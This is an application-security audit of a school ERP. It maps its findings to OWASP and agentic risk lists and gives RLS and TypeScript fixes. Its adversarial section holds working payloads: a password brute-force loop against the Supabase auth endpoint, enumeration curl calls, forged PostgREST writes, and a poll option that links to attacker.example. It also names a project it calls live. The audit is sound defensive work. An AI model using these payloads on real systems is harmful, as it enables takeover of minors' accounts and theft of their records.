# Application Security & Agentic Threat-Model Audit — Pacific World School ERP

**Target:** `sahajiscoding/schoolerp` @ `99de0ba` (branch `arena/61a3f060-schoolerp`)
**Audit date:** 2026-11-06
**Scope:** `apps/admin` (React 19 + Vite SPA), `apps/mobile` (Expo), `packages/shared`, `supabase/` (Postgres schema, RLS, Edge Functions), `scripts/`, `.github/workflows/`, build/deploy config (`vercel.json`).
**Method:** manual source trace of every authorization boundary; pattern sweep for sinks/secrets over **all git history**; `npm audit` against `package-lock.json`; executable proof-of-concept tests (`apps/admin/tests/poc-security.test.tsx`, 4 tests, green).

> **Pre-publication check.** This is a school system holding minors' records (DOB, guardian phone, marks, medical leave reasons). Verify the repository visibility before any external distribution of this report. No exploitable credentials were found in history, but the report itself documents the deterministic password scheme.
>
> **Deployment status (from `PROJECT_STATUS.md`).** Migrations `0001`–`0004` are **already applied to the live Supabase project `ausnymdtnpewcfvdrpcu`** (32 tables, all RLS-enabled, empirically verified by the prior audit). That means the *database* findings in this report — **F-02, F-03, F-08, F-10, F-11, F-12** — are **live and exploitable against production data today**, not latent. The client-side findings (**F-04, F-05, F-07, F-16, F-17**) are currently limited to the demo store, because `PROJECT_STATUS.md` records that the admin console has not yet been wired to Supabase; they become live the moment that wiring lands. The Edge Function is not yet deployed (`PROJECT_STATUS.md` "Next up" item 3), so F-07/F-15 are pre-deployment fixes.

---

## 0. Executive summary

The backend authorization model is **better than typical for a project of this size**: RLS is enabled on all 32 tables, `SECURITY DEFINER` helpers pin `search_path = ''`, the known `profiles` self-escalation and forged-audit-entry issues from the prior audit (`docs/audits/2026-11-05-security-audit-findings.md`) are closed, and the Edge Function does verify JWT → active-admin → input. Client-side XSS handling of the two `document.write` sinks is correct.

The material risk has **moved to the identity and credential layer**, and it is not small:

1. **Every student password is a deterministic function of the admission number and date of birth** (`Student@DDMMYYYY`). Both are printed in the UI, on report cards and in CSV exports, and DOB is readable by **any teacher of that student**. This is an offline-brute-forceable (~5,000 candidates), non-rotatable credential for a minor's account, made worse by `apps/mobile` having no password-change flow and the admin console never enforcing `must_change_password`. **Fix before the first production import** — once real accounts exist on the live project, this is a mass-credential incident, not a code review finding.
2. **No row-level authorization exists on four federation-style write paths** — declaration signatures (public), poll options (public), poll votes (any student), notice read receipts (any user, unaudited). Two of them let an ordinary student publish content to **every user in the school**.
3. **`viewAsRole()` is a display override wired into `isAdmin()`/`requireRole()`**, so a teacher session can open every "admin-only" route client-side. RLS holds for table writes, but the audit trail, CSV exports and deletion affordances all follow the client gate.
4. **Audit trail integrity is inconsistent**: the console promises admins "cannot edit or delete" entries and that reads are logged, but `audit_log` accepts inserts without an actor binding, has no immutability grant, and the two exports (`People`, `Fees`) are unaudited.

There is **no** prompt-injection, RAG, MCP-server, LLM-tool-execution or model-output-injection surface in this repository today (see §2.1) — the agentic taxonomy in the brief maps onto these "machine-consumed trust boundaries" (a leaked DOB *is* an indirect prompt to the credential-derivation function), which is where I applied it.

| # | Finding | Severity | CWE | One-line |
|---|---|---|---|---|
| F-01 | Credentials derived from public data (`Student@DDMMYYYY`) | **Critical** | CWE-1391, 521 | Full account takeover of any student from an admission number + DOB |
| F-02 | No server-side authorization on declaration signatures | **Critical** | CWE-639 (BOLA) | Any signed-in user can sign any declaration for any student |
| F-03 | Poll options insertable by any user | **High** | CWE-639 (BFLA) | Injectable ballot options visible school-wide; forged results |
| F-04 | `viewAsRole` feeds `isAdmin()`/`requireRole()` | **High** | CWE-863 | Teacher session opens all admin client gates |
| F-05 | Student PII (DOB, phone, initial password) in client store → `localStorage` | **High** | CWE-312, 359 | Device theft/any XSS = bulk minor PII |
| F-06 | `must_change_password` never enforced; no change-password flow anywhere | **High** | CWE-620 | Initial derived password stays valid forever |
| F-07 | Bulk student import returns every plaintext password in the response | **Medium** | CWE-257, 532 | 200 credentials per call, no re-issue path |
| F-08 | Poll votes: any student can vote on any poll, impersonate, and vote for options from another poll | **Medium** | CWE-639, 1284 | Ballot stuffing / attribution forgery |
| F-09 | Audit log: no actor binding, no immutability, insert errors ignored, exports unaudited | **Medium** | CWE-778, 117 | Repudiation + false assurance in the UI |
| F-10 | Notice read-receipts writable by any user | **Medium** | CWE-639 | Destroy delivery evidence |
| F-11 | Directory unmapped: `is_enrolled()` is unscoped, `class_teacher_of_section()` leaks at `anon` | **Medium** | CWE-1230, 862 | Any user can test "is X enrolled"; `anon` can query any section's class teacher |
| F-12 | `books`/`book_issues` writable by **every** teacher | **Medium** | CWE-863 | Catalog destruction + unlinkable fine fabrication |
| F-13 | Data residency / transfer: US-hosted Postgres holding minors' records | **Medium** | — | DPDP Act 2023 §16(1) restriction + Rule 15(2) security obligations |
| F-14 | Weak privilege triggers / `%TYPE` helper | **Low** | CWE-1178, 209 | Trigger can pass for an admin escalation path; two triggers have mutable `search_path` |
| F-15 | Edge Function: wrong status for unexpected errors, blanket CORS, floating third-party import | **Low** | CWE-209, 1104, 829 | Error/secret handling and supply-chain hardening |
| F-16 | Seed data ships a realistic full name + mobile number as demo PII | **Low** | CWE-359 | Real-looking personal data in every public bundle |
| F-17 | `printHtml`/`StudyRoom` escape at call sites only, unguarded interpolations | **Low** | CWE-79 | One future raw interpolation = stored XSS in a print window |
| F-18 | CI blind spot: no migration/Edge Function linting, no dependency-CVE gate | **Low** | CWE-1104 | The schemas protecting PII are not scanned or tested in CI |

**Exploitability status against the deployed project**

| Finding | Live today? | Why |
|---|---|---|
| F-01 | **Yes (scheme)** / demo-only (display) | Migrations applied; any account provisioned via the Edge Function/CLI gets a derived password. No account provisioning has been run yet per `PROJECT_STATUS.md`, so rotate *before* the first real import. |
| F-02, F-03, F-08, F-10, F-11, F-12 | **Yes** | These are RLS policies in `0001`/`0002`, already applied to `ausnymdtnpewcfvdrpcu` |
| F-04, F-05, F-07, F-16, F-17 | Demo store only *(until wiring lands)* | `PROJECT_STATUS.md`: the console still reads `appData.tsx`; the Edge Function is not deployed |
| F-06 | **Yes** | `profiles.must_change_password` is live and unused |
| F-09 | **Yes (schema)** | `audit_log` policies applied; console-side audit is demo-only |
| F-13, F-15, F-18 | Process / pre-deployment | No storage buckets, no deployed function, CI config |

**Remediation priority**

- **Immediate hotfixes (≤72h):** F-01 (re-issue credentials + random passwords), F-02, F-03, F-04, F-06.
- **Next sprint:** F-05, F-07, F-08, F-10, F-12, F-14.
- **Architectural hardening (quarter):** F-09, F-11, F-13, F-15, F-17, F-18, plus the DPDP/NIST control programme in §6.

---

## 1. Phase 1 — Attack surface & asset map

### 1.1 Entry points

| Entry point | Location | AuthN | AuthZ | Notes |
|---|---|---|---|---|
| Supabase REST/PostgREST (`/rest/v1/*`) | Supabase project | JWT (anon key + user JWT) | **RLS** | The *only* real authorization boundary |
| Supabase Auth (`/auth/v1/*`) | Supabase project | password | — | username = `slug(loginId)@pws.local` |
| Supabase Realtime | `config.toml` (not configured) | JWT | RLS | No `[realtime]` block → default; tables not added to publication |
| Supabase Storage | **none configured** | — | — | `attachment_path`/`avatar_path`/`file_path` columns exist with **no bucket or policy migration** |
| Edge Function `admin-users` | `supabase/functions/admin-users/index.ts` | `getUser()` | `profiles.role='admin' AND is_active` | `verify_jwt` not set in `config.toml` → platform default; function self-checks anyway |
| Bootstrap CLI | `scripts/create-admin.mjs` | OS env secret | service role | Prompted password, min 10 chars |
| Admin SPA | `apps/admin` (Vercel static) | Supabase Auth | client gates + RLS | `vercel.json` headers, CSP present |
| Mobile app | `apps/mobile` | none implemented | none | Bare Expo template (`App.tsx` is boilerplate) |
| CI/CD | `.github/workflows/*` | GitHub | — | CodeQL (JS/TS), OSSAR, Codacy, secret-name grep |

**No MCP servers, tool-execution hooks, connectors, or agent runtimes exist in this repository.** The `.claude/` artefact is a 5-line plugin-enable file (`apps/mobile/.claude/settings.json`) with no permissions or hooks.

### 1.2 Data flows

```
[student/parent browser] --loginId+password--> Supabase Auth
        |                                         |
        | JWT                                     v
        +----------------> PostgREST ----RLS----> Postgres (32 tables)
        |                  (policies in 0001-0004)
        |
        +--> localStorage  (pws.demo.data.v4: people[] incl. dob, phone, password)
        +--> sessionStorage (pws.showcase.role)
        +--> window.open + document.write  (print windows: escaped at call sites)
        +--> CSV/blobs (People export, Fees export)  -- unaudited
        +--> Vercel static bundle (public Supabase URL + publishable key only)

[admin SPA] --Bearer JWT--> Edge Function admin-users --service_role--> auth.admin.createUser
                                 |                                      |
                                 +--> profiles / student_details / audit_log (RLS bypassed)
                                 +--> response { results: [{ admissionNo, password }] }

CLI (create-admin.mjs) --service_role--> same tables
```

**Trust boundary observation (the core issue).** The client is treated as trusted for two things it must not be: (a) **credential generation** (`passwordFromDob` in `apps/admin/src/lib/utils.ts:32`, mirrored server-side in the Edge Function) and (b) **role/affordance decisions** (`effectiveRole`, `viewAsRole`). Additionally the client is trusted with **bulk PII** it does not need (F-05).

### 1.3 Supply chain

- `package-lock.json` present; `npm audit` → **0 vulnerabilities** (all severities) as of 2026-11-06.
- GitHub Actions are pinned to full SHAs in `ci.yml`, `codeql.yml`, `ossar.yml` (good).
- Edge Function imports **unpinned third-party CDN code at runtime**: `https://esm.sh/@supabase/supabase-js@2.45.0` — a version pin with no integrity hash, resolved live from a third-party CDN inside your trust boundary (F-15).
- Version skew: admin declares `@supabase/supabase-js ^2.45.0`, mobile `^2.118.0`, Edge Function pins `2.45.0`. Not a CVE, but three different auth-client behaviours in one product.
- No typosquatting indicators found in direct dependencies; no `postinstall` scripts in project packages. `node_modules` is gitignored and `.gitattributes` present.
- `packages/shared/package.json` declares `zod ^4.6.7` with **zero usage anywhere in the repo** — the intended input-validation layer is a dependency without an implementation.
- `.oxlintrc.json` includes a plugin (`oxc`) that is not a declared dependency, so `oxlint` cannot run from a clean clone; `ci.yml` also never runs it. Dead quality gate.

---

## 2. Phase 2 — OWASP Top 10 / Agentic risk evaluation

### 2.1 Applicability of the LLM/agentic taxonomy

I checked explicitly for the classes in the brief and they are **absent by design** (this is a deterministic CRUD ERP):

| Agentic risk | Present? | Evidence |
|---|---|---|
| Prompt injection (direct / indirect via RAG) | **No** | No LLM client, no prompt strings, no RAG, no embeddings, no vector store |
| Insecure output handling (model → shell/SQL/eval) | **No** (LLM) / **Yes** (analogue) | No `eval`, no `new Function`, no shell, no string-built SQL. PostgREST parameters are structured. The analogue is *data → `document.write`* (assessed in F-17) |
| Model/plugin supply-chain (tool poisoning) | **No MCP** | No `mcp.json`, no connector config, no tool manifests |
| Excessive agency / confused deputy | **Yes (analogue)** | `viewAsRole()` (F-04); `admin-users` acting with service role on client-supplied rows (F-07) |
| Sensitive-data disclosure in prompts/logs | **Yes (analogue)** | Credentials and minor PII in client store, API responses, CSV (F-01, F-05, F-07) |
| Training-data poisoning | **No** | No model training |

**Where the agentic framing genuinely bites:** a credential-derivation function is a machine that consumes "public field A + semi-public field B" and emits an authentication secret. That is exactly the "untrusted input reaches a privileged sink" pattern, and it is the highest-impact finding here.

### 2.2 OWASP Top 10 (2021) mapping

| Category | Status | Notes |
|---|---|---|
| A01 Broken Access Control | **Fail** | F-02, F-03, F-04, F-08, F-10, F-11, F-12 — seven distinct missing-scope issues |
| A02 Cryptographic Failures | **Fail** | F-01 deterministic credentials; F-05 cleartext PII at rest in browser |
| A03 Injection | **Mostly pass** | No SQLi/XSS/command injection found; `document.write` sinks are escaped at every call site (fragile — F-17) |
| A04 Insecure Design | **Fail** | Credential scheme (F-01), audit assurance gap (F-09) |
| A05 Security Misconfiguration | **Partial** | Headers/CSP good (`vercel.json`); Edge CORS `*` (F-15); no storage policies for `*_path` columns; no `[storage]`/`[realtime]` section |
| A06 Vulnerable & Outdated Components | **Pass today** | `npm audit` clean; pinning/verification gaps (F-15) |
| A07 Identification & Authentication Failures | **Fail** | F-01, F-06 (no rotation enforcement, no change-password, no MFA for admin) |
| A08 Software & Data Integrity | **Partial** | Audit log mutability (F-09); unpinned CDN import (F-15) |
| A09 Logging & Monitoring Failures | **Fail** | F-09: no failed-auth monitoring, no export auditing, unaudited admin writes |
| A10 SSRF | **Pass** | No user-controlled outbound requests |

### 2.3 OWASP Top 10 for LLM / Agentic (contextual)

| LLM/Agentic risk | Analogous control gap found |
|---|---|
| LLM01 Prompt injection | None (no LLM). Closest analogue: **client-supplied trust in role** (F-04) |
| LLM02 Insecure output handling | `document.write` print sinks — currently escaped, no type-level barrier (F-17) |
| LLM03 Training data poisoning | N/A; **seed data** carries realistic PII into every bundle (F-16) |
| LLM04 Model DoS | N/A |
| LLM05 Supply-chain | Runtime CDN import, unpinned; unused `zod` (F-15) |
| LLM06 Sensitive info disclosure | F-05, F-07 (bulk PII/credentials in responses) |
| LLM07 Insecure plugin design | Edge Function = the "plugin": validates role but not response minimization (F-07) |
| LLM08 Excessive agency | `viewAsRole` (F-04) |
| LLM09 Overreliance | UI states "admins cannot edit or delete audit entries" — **false** (F-09) |
| LLM10 Model theft | N/A |

---

## 3. Phase 3 — Static analysis (SAST)

### 3.1 Positive controls confirmed (do not regress these)

1. RLS enabled on every table in `0001`/`0002`; `0004` narrows `profiles` and closes forged audit inserts.
2. All `SECURITY DEFINER` helpers use `SET search_path = ''` with schema-qualified bodies; `0003` revokes `PUBLIC` EXECUTE.
3. Deadline-correct negative patterns avoided in the RLS text: parameter shadowing (`teaches_section(p_section_id)`) and correlation (`threads.student_id`, `poll_options.poll_id`) are explicitly commented — these are the two classic Postgres RLS footguns.
4. `vercel.json` ships `X-Frame-Options: DENY`, HSTS preload, `nosniff`, a restrictive CSP (`script-src 'self'`, `object-src 'none'`), `frame-ancestors 'none'`.
5. CI greps for secret-like `VITE_`/`EXPO_PUBLIC_` names and for `SUPABASE_SERVICE_ROLE_KEY` under `apps/`.
6. Secrets sweep over **all git history** (`git rev-list --all` + regex for JWT/`sbp_`/`sk-`/service-role assignments): **no hits**.
7. Error handling in the SPA and Edge Function does not leak stack traces or DB config; the Edge Function maps unknown actions/JSON errors to 400 and configuration failures to a generic 500 message.
8. `String(row.x ?? '')` coercions in every Edge Function input guard prevent prototype/object confusion; batch size capped at 200.

### 3.2 Dangerous-pattern inventory

| Pattern | Result |
|---|---|
| `eval` / `new Function` / `child_process` | None |
| `dangerouslySetInnerHTML` | None |
| `document.write` | 2 sites (`utils.printHtml`, `StudyRoom.openMaterial`) — both escaped, both carry `eslint-disable` for a `no-restricted-syntax` rule that **does not match them** (§Findings F-17) |
| Untrusted → `window.open`/blob URL | Title/name is `escapeHtml()`-ed into `<title>`; no `javascript:` URL construction |
| Hardcoded secrets / tokens | None (verified in history) |
| `localStorage` persistence | 4 keys; `pws.demo.data.v4` contains PII + passwords (F-05) |
| Numerical/`panic` sinks on untrusted input | `rc.percentage.toFixed(1)` and `s.marks / (s.max_marks || 100)` — demo-state only; see F-17 |
| SQL built by concatenation | None (PostgREST builders only) |
| `postMessage` / `target="_blank"` without `noopener` | None |

### 3.3 Logging / error-leak review

No PII or credentials are written to console/server logs (`console.*` is absent from `apps/`). The Edge Function **logs nothing at all** — no structured record of failed admin checks, which matters for F-09/A09.

---

## 4. Phase 4 — Adversarial test cases & payloads

All payloads are for **your own staging project with dummy data**. Every item below was derived from the policy text in this repo, so each should behave exactly as stated.

### 4.1 Deterministic credential takeover (F-01) — highest-value chain

**Preconditions:** any authenticated account; target admission number (public: report cards, CSV export, printed documents) and DOB. DOB is obtainable by *any teacher of that student* via `student_details` (`0002:305`), and by **any user** via `is_enrolled` + directory gaps (F-11).

```bash
# 1. Candidate generation — no network, ~5k tries for a school-age child
python3 - <<'PY'
import itertools, datetime
for y in range(2008, 2020):
  d = datetime.date(y,1,1)
  while d.year == y:
    print(f"Student@{d:%d%m%Y}"); d += datetime.timedelta(days=1)
PY

# 2. Single-request verification as a new student session
for pw in $(python3 ... ); do
  curl -s -X POST "https://<proj>.supabase.co/auth/v1/token?grant_type=password" \
    -H "apikey: <publishable>" -H "Content-Type: application/json" \
    -d "{\"email\":\"0185-18@pws.local\",\"password\":\"$pw\"}" | grep -q access_token && echo "GOT $pw"
done
```

**Variant — no DOB needed:** request `GET /rest/v1/student_details?select=profile_id,date_of_birth&profile_id=in.(<class roster>)` as any teacher of that section; or as **any** user, probe `is_enrolled()` (§4.3) to confirm a target is enrolled, then obtain DOB from the admin CSV export on a shared kiosk.

**Variant — identity collision:** `toAuthEmail()` rewrites every non-`[a-z0-9._-]` char to `-` and collapses repeats, so `PWS/1`, `PWS-1`, `PWS//1` all become `pws-1@pws.local`. Two different admission numbers can therefore collide onto one login (confirmed by PoC-1).

### 4.2 `viewAsRole` client escalation (F-04)

```js
// DevTools console, as an authenticated teacher (no request is made)
__react_fiber_probe__ // or: drive the UI — set the RoleSwitcher state
// Effect: isAdmin() === true  →  nav shows People/Classes/Subjects/Enrollments/Audit Log,
//         <AdminOnly> routes render, "Share PDF"/"Add book" affordances appear.
```

**What it does not do:** RLS still blocks table writes. **What it does do:** the Audit Log page (client-rendered from `pws.demo.data.*`), the People CSV export (with initial passwords) and every client-side guard now follow the attacker's chosen role. Regression test: `tests/poc-security.test.tsx` → *PoC-2*.

### 4.3 Enumeration oracle via `is_enrolled` (F-11)

```bash
# Any role, including anon (function is UNMAPPED and body is not caller-scoped):
curl -s "https://<proj>.supabase.co/rest/v1/rpc/is_enrolled" \
  -H "apikey: <publishable>" -H "Authorization: Bearer <anon-or-any-user-jwt>" \
  -H "Content-Type: application/json" -d '{"p_student_id":"<uuid>"}'
# true  => that user is enrolled (i.e. is a student). Repeat over harvested UUIDs.

# anon can also read any section's class teacher:
curl -s "https://<proj>.supabase.co/rest/v1/rpc/class_teacher_of_section" \
  -H "apikey: <publishable>" -d '{"target_section":"<uuid>"}'
```

### 4.4 Ballot and roster forgery (F-02, F-03, F-08, F-10)

```bash
# F-03 — any signed-in user injects an option into a live poll (school-wide visible)
POST /rest/v1/poll_options
{"poll_id":"<any-poll>","label":"<a href=//attacker.example>Vote here for free marks</a>","position":99}

# F-02 — any signed-in user "signs" a declaration as any student (audit-grade record)
POST /rest/v1/declaration_signatures
{"form_id":"<any-form>","student_id":"<victim>"}

# F-08 — cross-poll option substitution + impersonation
POST /rest/v1/poll_votes
{"poll_id":"<poll-A>","option_id":"<option-from-poll-B>","student_id":"<victim>"}

# F-10 — destroy delivery evidence
PATCH /rest/v1/notice_recipients?notice_id=eq.<n>&user_id=eq.<victim>
{"read_at":null}
```

### 4.5 Multi-turn / "crescendo" chains that fit this application

The application has no chat surface, so classic jailbreak turns do not apply. The equivalent kill-chains in an ERP are **privilege accumulation across modules**; three that work with findings above:

1. **Reader → registrar.** Student account → §4.3 oracle finds classmates → `student_details` read (teacher of the section, or F-11 directory gap) harvests DOB → §4.1 derives credentials → login as a classmate → read their fees, medical leave notes and report cards. *(F-01 + F-11)*
2. **Teacher → school-wide publisher.** Teacher account → F-03 injects a poll option that renders as a phishing link for every user in the school → collect credentials out-of-band. *(F-03)*
3. **Any teacher → destructive insider.** Teacher account → `books`/`book_issues` `FOR ALL` (§F-12) → delete the library catalogue, then insert `book_issues` rows with `fine_amount` against arbitrary students (no `issued_by` binding), which feed the Fees module. *(F-12)*

### 4.6 Detection payload markers

Use unique canaries and alert on them (these should *never* be legitimate):

- `label`: `AUDIT-CANARY-POLL-<uuid>`
- `full_name`: `AUDIT-CANARY-NAME-<uuid>` (see F-17)
- `login_id`: `audit.canary.<uuid>`
- Postgres `log_statement = 'all'` on staging; grep for `poll_options`, `declaration_signatures`, `notice_recipients`, `audit_log` writes by non-admin roles.

---

## 5. Phase 5 — Findings, root cause, remediation

Each finding: **severity → root cause → evidence → fix (with code) → verification**.

---

### F-01 — Deterministic, non-rotatable student credentials · **CRITICAL**

**Root cause.** The initial password is a pure function of two non-secret values: `Student@DDMMYYYY`. Implemented three times (`apps/admin/src/lib/utils.ts:32`, `apps/admin/src/lib/appData.tsx:277/317`, `supabase/functions/admin-users/index.ts:26,185`) with no randomness, no forced rotation, no reset path (F-06). The auth identity is derived from the admission number (`authEmail()`), which is printed on public-facing artefacts.

**Evidence.**

- `apps/admin/src/lib/utils.ts:32` — `passwordFromDob()`; UI renders it (`People.tsx:286, 330, 378, 445`), toasts it (`appData.tsx:295`), exports it as CSV (`People.tsx:188, 211`).
- `supabase/functions/admin-users/index.ts:185` — server re-derives the same value; `:220` returns it in the response body for up to 200 students.
- `docs/audits/2026-11-05-security-audit-findings.md:92` (F5) itself notes the scheme "enables username/role enumeration against predictable DOB-derived passwords" — the enumeration was fixed, the **credential design was not**.
- Confirmed by PoC-1 (`tests/poc-security.test.tsx`): candidate space ≈ 5,478 (ages 3–18), single verification request per candidate.

**Impact.** Any party holding an admission number + DOB (any teacher of that student, any parent, any leaked CSV) can authenticate as that student: read fees, report cards, medical leave reasons, messaging threads; send messages to teachers; submit assignments. Because the derived password is *shown to the administrator*, it is also recoverable later from screen-shares, photos and tickets. For a minor, this is a child-data compromise with DPDP significance (§6).

**Fix.**

1. **Issue random, one-time credentials server-side only.**

```ts
// supabase/functions/admin-users/index.ts
const NEW_PASSWORD_BYTES = 24;

/** Cryptographically random, URL-safe, no transcription ambiguity. */
function generatePassword(): string {
  const alphabet = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const bytes = crypto.getRandomValues(new Uint8Array(NEW_PASSWORD_BYTES));
  let out = '';
  for (const b of bytes) out += alphabet[b % alphabet.length];
  return `${out.slice(0, 4)}-${out.slice(4, 8)}-${out.slice(8, 12)}-${out.slice(12, 16)}`;
}
```

2. **Never derive, never re-display.** Replace `passwordFromDob(dateOfBirth)` with `generatePassword()`; delete `passwordFromDob` from `packages/shared` **and** `utils.ts`; remove the `password` field from `Person` (`apps/admin/src/lib/types.ts:26`) and the "Initial password" column/CSV column entirely.
3. **Deliver out-of-band, once.** Return per-row `{ admissionNo, status }` only. Deliver the credential via a single-use, short-TTL "set your password" token (Supabase `inviteUserByEmail` or your own `password_reset_tokens` table), never in the API response and never in the admin's screen.
4. **Force rotation before any data access** (see F-06).
5. **Rotate everything that exists today.** All accounts provisioned so far must be re-issued; treat every current student credential as compromised.

**Verification.** `grep -r "Student@" apps packages supabase` returns nothing; PoC-1's FIXED assertion (random secret ≥20 chars, no plaintext anywhere) is enabled.

---

### F-02 — No authorization on declaration signatures (BOLA) · **CRITICAL**

**Root cause.** The insert policy validates the *row*, not the *relationship*:

```sql
-- 0002_dashboard_modules.sql:352
CREATE POLICY "declaration_signatures_student_insert" ON declaration_signatures
  FOR INSERT WITH CHECK (auth.uid() = student_id);
```

Any authenticated user (including a teacher or admin, and any student) can insert a signature for any student, for any form — including forms not addressed to them. This table is the legal consent record for minors.

**Fix.**

```sql
-- migrations/0005_authorization_hardening.sql
BEGIN;

DROP POLICY IF EXISTS declaration_signatures_student_insert ON public.declaration_signatures;

CREATE POLICY declaration_signatures_student_insert ON public.declaration_signatures
  FOR INSERT WITH CHECK (
    -- 1. You may only sign as yourself.
    auth.uid() = student_id
    -- 2. Only students sign.
    AND public.app_role() = 'student'
    -- 3. The form must actually be addressed to you (and be open).
    AND EXISTS (
      SELECT 1
      FROM public.declaration_forms f
      WHERE f.id = declaration_signatures.form_id
        AND f.audience IN ('students', 'both')
        AND (f.due_date IS NULL OR f.due_date >= current_date)
        AND (
          cardinality(f.section_ids) = 0
          OR EXISTS (
            SELECT 1 FROM public.enrollments e
            WHERE e.student_id = auth.uid()
              AND e.section_id = ANY (f.section_ids)
          )
        )
    )
  );

-- Signatures are append-only evidence; nothing may update/delete them.
REVOKE UPDATE, DELETE ON public.declaration_signatures FROM anon, authenticated;

COMMIT;
```

Rationale for `cardinality(...) = 0`: it matches the `school_events` convention in your own schema ("empty array = whole school"). Apply the same predicate to `declaration_forms_read` so read and write scopes agree.

---

### F-03 — Any user can inject poll options (BFLA) · **HIGH**

**Root cause.**

```sql
-- 0002_dashboard_modules.sql:364
CREATE POLICY "poll_options_owner_insert" ON poll_options
  FOR INSERT WITH CHECK (
    EXISTS (SELECT 1 FROM polls p WHERE p.id = poll_options.poll_id AND p.created_by = auth.uid())
  );
```

This is correct in isolation, but it is **neutered by `polls_teacher_insert`** (`0002:358`), which lets *any* teacher create a poll with an arbitrary `question` and arbitrary `section_ids` (or none) — i.e. every teacher can publish to the whole school. Worse, `polls` is **never scoped on read** (`polls_read USING (true)`, `:356`; `poll_options_read USING (true)`, `:362`), so the injected option is visible to every user.

**Impact.** Content injection with school-wide reach from a single teacher account (phishing link in an `<option>`, abusive text under the school's branding), plus fabricated results for a poll the attacker created and can close.

**Fix.**

```sql
DROP POLICY IF EXISTS polls_teacher_insert ON public.polls;
CREATE POLICY polls_teacher_insert ON public.polls
  FOR INSERT WITH CHECK (
    auth.uid() = created_by
    AND (public.is_admin() OR public.app_role() = 'teacher')
    -- A non-admin may not broadcast school-wide…
    AND (public.is_admin() OR cardinality(section_ids) > 0)
    -- …and may only target sections they actually teach.
    AND NOT EXISTS (
      SELECT 1 FROM unnest(section_ids) AS s(section_id)
      WHERE NOT public.teaches_section(s.section_id)
    )
  );

-- Tighten option writes to an open poll owned by the caller.
DROP POLICY IF EXISTS poll_options_owner_insert ON public.poll_options;
CREATE POLICY poll_options_owner_insert ON public.poll_options
  FOR INSERT WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.polls p
      WHERE p.id = poll_options.poll_id
        AND p.created_by = auth.uid()
        AND (p.closes_on IS NULL OR p.closes_on >= current_date)
    )
  );

-- Belt and braces: one option per (poll, position) so an injected option
-- cannot be forced to the top of a rendered list.
ALTER TABLE public.poll_options
  ADD CONSTRAINT poll_options_position_unique UNIQUE (poll_id, position);

-- Scope poll reads to the audience (mirrors declaration_forms_read).
DROP POLICY IF EXISTS polls_read ON public.polls;
CREATE POLICY polls_read ON public.polls
  FOR SELECT USING (
    public.is_admin()
    OR created_by = auth.uid()
    OR cardinality(section_ids) = 0
    OR EXISTS (
      SELECT 1 FROM public.enrollments e
      WHERE e.student_id = auth.uid() AND e.section_id = ANY (polls.section_ids)
    )
  );
```

---

### F-04 — Client role override feeds authorization helpers · **HIGH**

**Root cause.** `viewingRole` (a pure UI convenience for admins) is consumed by the *authorization* functions:

```ts
// apps/admin/src/contexts/AuthContext.tsx:96-104
const effectiveRole = useMemo(() => {
  if (viewingRole) return viewingRole;      // ← attacker/UI-controlled for ANY session
  return profile?.role ?? null;
}, [viewingRole, profile]);
const isAdmin = () => effectiveRole === 'admin';
const requireRole = (roles) => !!effectiveRole && roles.includes(effectiveRole);
```

The switcher in `AppShell.tsx:366` is gated on `profile.role === 'admin'`, but the *capability* is not. `useAuth().viewAsRole('admin')` from a teacher session makes `isAdmin()` true, opening `AdminOnly` routes (`App.tsx:AdminOnly`), admin nav, "Share PDF", library management, etc. PoC-2 proves it (`tests/poc-security.test.tsx`).

RLS remains the table-write boundary, so this is not immediate mass data corruption — but it defeats every client-side guard, exposes the People/CSV surface (F-07) and the audit view, and it is one `canWrite` check away from being a full escalation.

**Fix.** Separate **display role** from **authorization role**; make the override impossible for non-admins and impossible to reach authorization at all.

```tsx
// apps/admin/src/contexts/AuthContext.tsx
const actualRole: Role | null = profile?.role ?? null;           // authority
const [previewRole, setPreviewRole] = useState<Role | null>(null);

// UI-only. Never consulted by isAdmin/requireRole.
const displayRole: Role | null =
  actualRole === 'admin' && previewRole ? previewRole : actualRole;

const viewAsRole = useCallback((role: Role | null) => {
  if (actualRole !== 'admin') return;   // server-independent refusal
  setPreviewRole(role);
}, [actualRole]);

// Authorization helpers read ONLY the real role.
const isAdmin = () => actualRole === 'admin';
const requireRole = (roles: Role[]) => actualRole !== null && roles.includes(actualRole);
```

Then:

- `<AdminOnly>` must use `isAdmin()` (real role) — never `displayRole`.
- `AppShell` uses `displayRole` **only** for labels/nav highlighting, and must render a persistent "Previewing as …" banner.
- Make the boundary compiler-enforced: give `displayRole` a branded type (`type DisplayRole = Role & { __displayOnly: true }`) so it cannot be passed to `requireRole`.
- Add a lint rule/test asserting `viewAsRole` is a no-op for non-admin sessions (flip PoC-2's FIXED assertion).
- For the real product: the "view as" feature should be a **server-side** impersonation flow that mints a scoped, short-lived, audited token — never a client state flip.

---

### F-05 — Sensitive student PII and passwords in the client store · **HIGH**

**Root cause.** `Person` carries `dob`, `phone`, `admission_no` and `password` (`apps/admin/src/lib/types.ts:15-26`); the entire `AppState`, including `people[]`, is serialized on every change to `localStorage` (`apps/admin/src/lib/appData.tsx:84-85, 248`). Rendered/exported in `People.tsx:258-286`. PoC-3 confirms DOB (`YYYY-MM-DD`), `+91` phone numbers and `Student@…` passwords in `pws.demo.data.v4`.

**Impact.** Any script on the origin (a future dependency compromise, an unescaped print sink, a malicious browser extension), any shared/kiosk device, and any XSS retroactively yields the whole student roster. Note the *live* mode persists this state under `pws.demo.data.v4` too — the key name says "demo" but the write is unconditional.

**Fix.**

```ts
// 1. Persist only non-sensitive UI state. Never the roster.
// apps/admin/src/lib/types.ts
export interface Person {
  id: string; login_id: string; full_name: string; role: Role;
  is_active: boolean; class_label?: string; section_label?: string;
  // password / dob / phone / admission_no deliberately absent
}

// 2. Allow-list what reaches storage.
const PERSISTED_KEYS = ['people', 'events', 'notices', 'audit'] as const; // no credentials, no DOB/phone
function persistable(state: AppState): Partial<AppState> {
  const { people, ...rest } = state;
  return {
    ...Object.fromEntries(PERSISTED_KEYS.map((k) => [k, (state as never)[k]])),
    people: people.map(({ id, full_name, login_id, role, is_active }) =>
      ({ id, full_name, login_id, role, is_active })),
  };
}
```

3. In live mode, storage is already wrong: **do not persist server data at all** — fetch it per view under RLS (the app already has `@tanstack/react-query`, unused). Restrict the `localStorage` mirror to `/demo`.
